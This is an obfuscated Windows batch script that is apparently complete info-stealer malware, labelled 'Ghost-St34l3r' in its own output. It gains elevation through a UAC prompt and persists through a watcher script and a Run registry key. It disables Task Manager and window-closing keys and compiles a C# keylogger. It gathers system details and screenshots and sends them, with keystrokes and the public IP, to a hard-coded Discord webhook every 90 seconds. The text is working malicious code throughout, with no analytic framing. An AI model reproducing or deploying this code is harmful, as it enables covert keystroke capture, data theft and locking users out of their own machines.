@echo off
setlocal enabledelayedexpansion
set "_a=color"
set "_b=0A"
%_a% %_b%

set "c_=c"
set "a_=a"
set "c__=cl"
set "s_=s"
set "_l=l"
set "s__=sy"
set "m_=m"
set "_r=r"
set "_o=o"
set "_t=t"
set "_%=."
set "r_=r"
set "dE=%s_%%_t%e%m_%%r_%%_o%%_o%%_t%"
set "ex_=e"
set "e_=e"

>nul 2>&1 "%dE%\%s_%%c_%c__%s_%%_%ex_%ex_%e_%" "%dE%\%s__%%s_%%_t%e%m_%%c_%%_o%nfig\%s_%%c__%%s_%%_t%e%m_%" 
if '%errorlevel%' NEQ '0' (
    goto dP
) else ( goto gA )

:dP
    set "t_=t"
    set "e__=e"
    set "p_=p"
    set "m__=m"
    set "v_=v"
    set "b_=b"
    set "s___=s"
    set "o_=o"
    echo Set %v_%%a_%%c_% = C%r_%%e_%%a_%%t_%eObject^("S%h_%%e__%%_l%%_l%.A%p_%%p_%%_l%i%c_%a%t_%i%o_%%n_%%"^) > "%t_%%e__%%m_%%p_%%\%g_%%e__%%t_%%a_%%d_%%m_%%i_%n%_%v_%%b_%%s___%%"
    set params = %*:"=""
    echo %v_%%a_%%c_%.S%h_%%e__%%_l%%_l%Execute "c%m_%%d_%.e%x_%e", "/%c_% %~s0 %params%", "", "%r_%%u_%%n_%%a_%%s___%%", 1 >> "%t_%%e__%%m_%%p_%%\%g_%%e__%%t_%%a_%%d_%%m_%%i_%n%_%v_%%b_%%s___%%"
    "%t_%%e__%%m_%%p_%%\%g_%%e__%%t_%%a_%%d_%%m_%%i_%n%_%v_%%b_%%s___%%"
    del "%t_%%e__%%m_%%p_%%\%g_%%e__%%t_%%a_%%d_%%m_%%i_%n%_%v_%%b_%%s___%%"
    exit /B

:gA
    set "p_=p"
    set "u_=u"
    set "h_=h"
    set "d_=d"
    set "C_=C"
    set "D_=D"
    %p_%%u_%%s_%%h_%%d_% "%C_%%D_%"
    %C_%%D_% /D "%~dp0"

set "_rnd=%random%%random%"
set "_w=watcher"
set "_v=vbs"
set "_s=script"
set "_m=marker"
set "_pers=persistent"

set "_file1=%temp%\%_w%_%_rnd%.%_v%"
set "_file2=%temp%\%_pers%_%_rnd%.bat"

>"%_file1%" (
echo Dim %_s%Obj, fso, wshObj, procMgr, procs, found, cmdPath
echo Set wshObj = CreateObject("WScript.Shell"^)
echo Set fso = CreateObject("Scripting.FileSystemObject"^)
echo Set procMgr = GetObject("winmgmts:\\.\root\cimv2"^)
echo Do
echo     On Error Resume Next
echo     found = False
echo     Set procs = procMgr.ExecQuery("Select * from Win32_Process Where Name = 'cmd.exe'"^)
echo     For Each proc in procs
echo         If InStr(proc.CommandLine, "P_E_R_S_%_m%"^) ^> 0 Then
echo             found = True
echo             Exit For
echo         End If
echo     Next
echo     
echo     If Not found Then
echo         cmdPath = "cmd.exe /c start /min cmd.exe /c ""cd /d " ^& WScript.Arguments.Item(0^) ^& " && " ^& WScript.Arguments.Item(1^) ^& """"
echo         wshObj.Run cmdPath, 0, False
echo     End If
echo     
echo     WScript.Sleep 750
echo Loop
)

copy "%~f0" "%_file2%" /Y >nul

start /min wscript.exe "%_file1%" "%temp%" "%_pers%_%_rnd%.bat P_E_R_S_%_m%"

set "_k1=H"
set "_k2=K"
set "_k3=C"
set "_k4=U"
set "_p1=S"
set "_p2=o"
set "_p3=f"
set "_p4=t"
set "_p5=w"
set "_p6=a"
set "_p7=r"
set "_p8=e"
set "_m1=M"
set "_m2=i"
set "_m3=c"
set "_m4=r"
set "_m5=o"
set "_m6=s"
set "_m7=o"
set "_m8=f"
set "_m9=t"
set "_w1=W"
set "_w2=i"
set "_w3=n"
set "_w4=d"
set "_w5=o"
set "_w6=w"
set "_w7=s"
set "_pl1=P"
set "_pl2=o"
set "_pl3=l"
set "_pl4=i"
set "_pl5=c"
set "_pl6=i"
set "_pl7=e"
set "_pl8=s"
set "_sy1=S"
set "_sy2=y"
set "_sy3=s"
set "_sy4=t"
set "_sy5=e"
set "_sy6=m"
set "_d1=D"
set "_d2=i"
set "_d3=s"
set "_d4=a"
set "_d5=b"
set "_d6=l"
set "_d7=e"
set "_t1=T"
set "_t2=a"
set "_t3=s"
set "_t4=k"
set "_t5=M"
set "_t6=g"
set "_t7=r"

set "_reg_key=%_k1%%_k2%%_k3%%_k4%\%_p1%%_p2%%_p3%%_p4%%_p5%%_p6%%_p7%%_p8%\%_m1%%_m2%%_m3%%_m4%%_m5%%_m6%%_m7%%_m8%%_m9%\%_w1%%_w2%%_w3%%_w4%%_w5%%_w6%%_w7%\%_pl1%%_pl2%%_pl3%%_pl4%%_pl5%%_pl6%%_pl7%%_pl8%\%_sy1%%_sy2%%_sy3%%_sy4%%_sy5%%_sy6%"
set "_reg_val=%_d1%%_d2%%_d3%%_d4%%_d5%%_d6%%_d7%%_t1%%_t2%%_t3%%_t4%%_t5%%_t6%%_t7%"

reg add %_reg_key% /v %_reg_val% /t REG_DWORD /d 1 /f >nul 2>&1

set "_ahk_file=%temp%\%random%%random%.ahk"

>"%_ahk_file%" (
echo #NoTrayIcon
echo #NoEnv
echo SetWorkingDir %%A_ScriptDir%%
echo #SingleInstance Force
echo 
echo ; Remapping keys
echo !F4::Return
echo !^F4::Return
echo !Tab::Return
echo #F4::Return
echo ^F4::Return
echo 
echo ; Message handler
echo OnMessage(0x11, "WM_QES"^)
echo WM_QES(wP, lP^)
echo {
echo     return false
echo }
echo 
echo ; Main loop
echo Loop
echo     Sleep, 100
echo Loop
)

set "_ps1=%temp%\%random%%random%.ps1"
set "_ahk_path=C:\Program Files\AutoHotkey\AutoHotkey.exe"

>"%_ps1%" (
echo $sig = @'
echo [DllImport("user32.dll")]
echo public static extern bool EnableWindow(IntPtr hWnd, bool bEnable);
echo [DllImport("user32.dll")]
echo public static extern IntPtr GetConsoleWindow();
echo [DllImport("user32.dll")]
echo public static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);
echo [DllImport("user32.dll")]
echo public static extern bool DeleteMenu(IntPtr hMenu, uint uPosition, uint uFlags);
echo '@;
echo Add-Type -MemberDefinition $sig -Name Win32Api -Namespace Win32;
echo $hwnd = [Win32.Win32Api]::GetConsoleWindow();
echo $menu = [Win32.Win32Api]::GetSystemMenu($hwnd, $false);
echo [Win32.Win32Api]::DeleteMenu($menu, 0xF060, 0x0);
echo [Win32.Win32Api]::EnableWindow($hwnd, $false);
echo if (Test-Path '%_ahk_path%') { Start-Process '%_ahk_path%' -ArgumentList '%_ahk_file%' -WindowStyle Hidden }
echo else { while($true) { Start-Sleep -m 100 } }
)

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%_ps1%" >nul 2>&1

set "_blockerCS=%temp%\%random%%random%.cs"
set "_blockerEXE=%temp%\%random%%random%.exe"

>"%_blockerCS%" (
echo using System;
echo using System.Runtime.InteropServices;
echo using System.Threading;
echo using System.Diagnostics;
echo 
echo class Blocker {
echo     [DllImport("kernel32.dll")]
echo     static extern IntPtr GetConsoleWindow();
echo 
echo     [DllImport("user32.dll")]
echo     static extern bool EnableWindow(IntPtr hWnd, bool bEnable);
echo 
echo     [DllImport("user32.dll")]
echo     static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
echo 
echo     [DllImport("user32.dll")]
echo     static extern int GetWindowLong(IntPtr hWnd, int nIndex);
echo     
echo     [DllImport("user32.dll")]
echo     static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
echo     
echo     const int SW_HIDE = 0;
echo     const int GWL_STYLE = -16;
echo     const int WS_SYSMENU = 0x80000;
echo 
echo     static void Main() {
echo         Process[] processes = Process.GetProcessesByName("explorer");
echo         IntPtr hwnd = GetConsoleWindow();
echo         if (hwnd != IntPtr.Zero) {
echo             ShowWindow(hwnd, SW_HIDE);
echo             int style = GetWindowLong(hwnd, GWL_STYLE);
echo             SetWindowLong(hwnd, GWL_STYLE, (style & ~WS_SYSMENU));
echo             EnableWindow(hwnd, false);
echo         }
echo         while(true) {
echo             Thread.Sleep(333);
echo         }
echo     }
echo }
)

powershell -WindowStyle Hidden -Command "if (Test-Path 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe') { Start-Process 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe' -ArgumentList '/nologo /out:\"%_blockerEXE%\" \"%_blockerCS%\"' -WindowStyle Hidden; Start-Sleep -s 1; if (Test-Path '%_blockerEXE%') { Start-Process '%_blockerEXE%' -WindowStyle Hidden } }" >nul 2>&1

set "_startupPS=%temp%\%random%%random%.ps1"

>"%_startupPS%" (
echo $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
echo $name = "SystemSecurity" + (Get-Random -Minimum 10000 -Maximum 99999)
echo $value = "cmd.exe /c start /min cmd.exe /c ""wscript.exe %_file1% %temp% \""%_pers%_%_rnd%.bat P_E_R_S_%_m%\"""""" 
echo if (!(Test-Path $regPath)) {
echo     New-Item -Path $regPath -Force | Out-Null
echo }
echo Set-ItemProperty -Path $regPath -Name $name -Value $value
)

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%_startupPS%" >nul 2>&1

set "_dataDir=%temp%\%random%%random%"
mkdir "%_dataDir%" 2>nul
cd "%_dataDir%"

set "_collectorPS=%_dataDir%\collector_%random%.ps1"

>"%_collectorPS%" (
echo function Get-SystemInfo {
echo     $compInfo = Get-ComputerInfo
echo     $netInfo = Get-NetIPConfiguration
echo     $installedSoft = Get-ItemProperty HKLM:\Software\*\*\Uninstall\* | Where { $_.DisplayName -ne $null }
echo     $processes = Get-Process | Select-Object Id, ProcessName, Path
echo     return @{
echo         "SystemInfo" = $compInfo
echo         "NetworkInfo" = $netInfo
echo         "Software" = $installedSoft
echo         "Processes" = $processes
echo     }
echo }
echo 
echo $sysData = Get-SystemInfo
echo $sysDataJson = $sysData | ConvertTo-Json -Depth 3 -Compress
echo $sysDataJson | Out-File -FilePath "$env:TEMP\%_dataDir%\sys_info.json"
echo 
echo Add-Type -AssemblyName System.Windows.Forms,System.Drawing
echo 
echo function Take-Screenshot {
echo     $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
echo     $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
echo     $gfx = [System.Drawing.Graphics]::FromImage($bmp)
echo     $gfx.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
echo     $ts = Get-Date -Format "yyyyMMdd-HHmmss"
echo     $path = "$env:TEMP\%_dataDir%\scr-$ts.jpg"
echo     $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Jpeg)
echo     $gfx.Dispose()
echo     $bmp.Dispose()
echo     return $path
echo }
echo 
echo $scrPath = Take-Screenshot
echo 
echo $klCode = @"
echo using System;
echo using System.IO;
echo using System.Runtime.InteropServices;
echo using System.Windows.Forms;
echo using System.Threading;
echo 
echo public class KL {
echo     private const int WH_KB_LL = 13;
echo     private const int WM_KD = 0x0100;
echo     private static LP _proc = Hook;
echo     private static IntPtr _hookID = IntPtr.Zero;
echo     private static string logPath = @"$env:TEMP\%_dataDir%\kl.txt";
echo     private static DateTime lastTime = DateTime.Now;
echo     private static string buf = "";
echo 
echo     public static void Main() {
echo         _hookID = SetHook(_proc);
echo         Application.Run();
echo     }
echo 
echo     private static IntPtr SetHook(LP proc) {
echo         using (var proc1 = System.Diagnostics.Process.GetCurrentProcess())
echo         using (var mod1 = proc1.MainModule) {
echo             return SetWinHookEx(WH_KB_LL, proc, GetModHandle(mod1.ModuleName), 0);
echo         }
echo     }
echo 
echo     private delegate IntPtr LP(int nCode, IntPtr wParam, IntPtr lParam);
echo 
echo     private static IntPtr Hook(int nCode, IntPtr wParam, IntPtr lParam) {
echo         if (nCode >= 0 && wParam == (IntPtr)WM_KD) {
echo             int vk = Marshal.ReadInt32(lParam);
echo             bool shift = (Control.ModifierKeys & Keys.Shift) != 0;
echo             
echo             string k = GetKeyText(vk, shift);
echo             buf += k;
echo             
echo             if (buf.Length > 50 || (DateTime.Now - lastTime).TotalSeconds > 20) {
echo                 WriteToLog();
echo             }
echo         }
echo         return NextHook(_hookID, nCode, wParam, lParam);
echo     }
echo     
echo     private static string GetKeyText(int vk, bool shift) {
echo         if (vk >= 65 && vk <= 90) {
echo             return shift ? ((Keys)vk).ToString() : ((Keys)vk).ToString().ToLower();
echo         } else if (vk >= 48 && vk <= 57 && !shift) {
echo             return ((Keys)vk).ToString().Replace("D", "");
echo         } else if (vk >= 96 && vk <= 105) {
echo             return ((Keys)vk).ToString().Replace("NumPad", "");
echo         } else {
echo             switch (vk) {
echo                 case 13: return "[ENT]";
echo                 case 32: return " ";
echo                 case 8: return "[BCK]";
echo                 case 9: return "[TAB]";
echo                 default: return "[" + (Keys)vk + "]";
echo             }
echo         }
echo     }
echo     
echo     private static void WriteToLog() {
echo         try {
echo             Directory.CreateDirectory(Path.GetDirectoryName(logPath));
echo             File.AppendAllText(logPath, $"{DateTime.Now:HH:mm:ss}-{buf}\r\n");
echo             buf = "";
echo             lastTime = DateTime.Now;
echo         } catch { }
echo     }
echo 
echo     [DllImport("user32.dll")]
echo     private static extern IntPtr SetWinHookEx(int idHook, LP lpfn, IntPtr hMod, uint dwThreadId);
echo 
echo     [DllImport("user32.dll")]
echo     private static extern bool UnhookWinHookEx(IntPtr hhk);
echo 
echo     [DllImport("user32.dll")]
echo     private static extern IntPtr NextHook(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
echo 
echo     [DllImport("kernel32.dll")]
echo     private static extern IntPtr GetModHandle(string lpModuleName);
echo }
echo "@
echo 
echo $klCode | Out-File "$env:TEMP\%_dataDir%\kl.cs"
echo 
echo try {
echo     Add-Type -TypeDefinition $klCode -ReferencedAssemblies System.Windows.Forms,System.Drawing
echo     $thread = New-Object System.Threading.Thread([System.Threading.ThreadStart]{
echo         [KL]::Main()
echo     })
echo     $thread.IsBackground = $true
echo     $thread.Start()
echo } catch {
echo     if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
echo         Start-Process "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/nologo /out:$env:TEMP\%_dataDir%\kl.exe $env:TEMP\%_dataDir%\kl.cs /reference:System.Windows.Forms.dll,System.Drawing.dll" -WindowStyle Hidden -Wait
echo         Start-Process "$env:TEMP\%_dataDir%\kl.exe" -WindowStyle Hidden
echo     }
echo }
)

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%_collectorPS%" >nul 2>&1

set "WH=htt"
set "WH1=ps://"
set "WH2=discord.co"
set "WH3=m/api/webhooks/"
set "WH4=134624687459"
set "WH5=5725382/"
set "WH6=_v4OQjZaLxp-qM-dTip"
set "WH7=6vAgoMCtr7AP7dAJXVsRTu-wz"
set "WH8=EKhkeLBtsBhVpRHgMFsAHHiX"
::Discord webhook here
set "WEBHOOK_URL=%WH%%WH1%%WH2%%WH3%%WH4%%WH5%%WH6%%WH7%%WH8%" 

:loopMain
set "_ipFile=%_dataDir%\ip_%random%.txt"
powershell -WindowStyle Hidden -Command "try { (New-Object Net.WebClient).DownloadString('https://api.ipify.org') } catch { 'unknown' }" > "%_ipFile%" 2>nul
set /p IP_PUBLIC=<"%_ipFile%"

powershell -WindowStyle Hidden -Command "$sc = Add-Type -AssemblyName System.Windows.Forms,System.Drawing -PassThru; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $gfx = [System.Drawing.Graphics]::FromImage($bmp); $gfx.CopyFromScreen(0, 0, 0, 0, $bounds.Size); $ts = Get-Date -Format 'MMddHHmmss'; $bmp.Save(\"$env:TEMP\%_dataDir%\sc-$ts.jpg\", [System.Drawing.Imaging.ImageFormat]::Jpeg); $gfx.Dispose(); $bmp.Dispose();" >nul 2>&1

powershell -WindowStyle Hidden -Command "if (Test-Path \"$env:TEMP\%_dataDir%\sys_info.json\") { $json = Get-Content \"$env:TEMP\%_dataDir%\sys_info.json\" -Raw; $payload = @{content=\"🔹 **SYSTEM DATA**\"; username=\"Monitor\"; avatar_url=\"https://media.discordapp.net/attachments/1260633531542012025/1346646778648334419/RedTiger_Logo.png?ex=67c8f20b&is=67c7a08b&hm=c2b33b9f1899685a6b881283ef4e8fef113c21a23604101af1205bdf84011a57&=&format=webp&quality=lossless&width=339&height=480\"} | ConvertTo-Json; Invoke-RestMethod -Uri \"%WEBHOOK_URL%\" -Method Post -ContentType \"application/json\" -Body $payload; $f = Get-ChildItem \"$env:TEMP\%_dataDir%\sc-*.jpg\" | Sort-Object LastWriteTime -Descending | Select-Object -First 1; curl.exe -F \"file1=@$($f.FullName)\" %WEBHOOK_URL% }" >nul 2>&1

powershell -WindowStyle Hidden -Command "if (Test-Path \"$env:TEMP\%_dataDir%\kl.txt\") { $c = Get-Content \"$env:TEMP\%_dataDir%\kl.txt\" -Raw; if ($c.Length -gt 0) { $p = @{content=\"⌨️ **KEYSTROKE LOG**\n```\n$($c.Substring(0, [Math]::Min(1500, $c.Length)))\n```\"; username=\"Monitor\"; avatar_url=\"https://media.discordapp.net/attachments/1260633531542012025/1346646778648334419/RedTiger_Logo.png?ex=67c8f20b&is=67c7a08b&hm=c2b33b9f1899685a6b881283ef4e8fef113c21a23604101af1205bdf84011a57&=&format=webp&quality=lossless&width=339&height=480\"} | ConvertTo-Json; Invoke-RestMethod -Uri \"%WEBHOOK_URL%\" -Method Post -ContentType \"application/json\" -Body $p; Clear-Content \"$env:TEMP\%_dataDir%\kl.txt\" } }" >nul 2>&1

set "_notifFile=%_dataDir%\notify_%random%.json"
>"%_notifFile%" (
echo {
echo   "content": "🔒 **Active system** 🔒\nUser: **%USERNAME%**\nComputer: **%COMPUTERNAME%**\nIP: **%IP_PUBLIC%**\nActive time: Continuous",
echo   "username": "Ghost-St34l3r",
echo   "avatar_url": "https://imgur.com/"
echo }
)

curl -s -X POST -H "Content-Type: application/json" -d @"%_notifFile%" %WEBHOOK_URL% >nul 2>&1

timeout /t 90 /nobreak >nul
goto loopMain
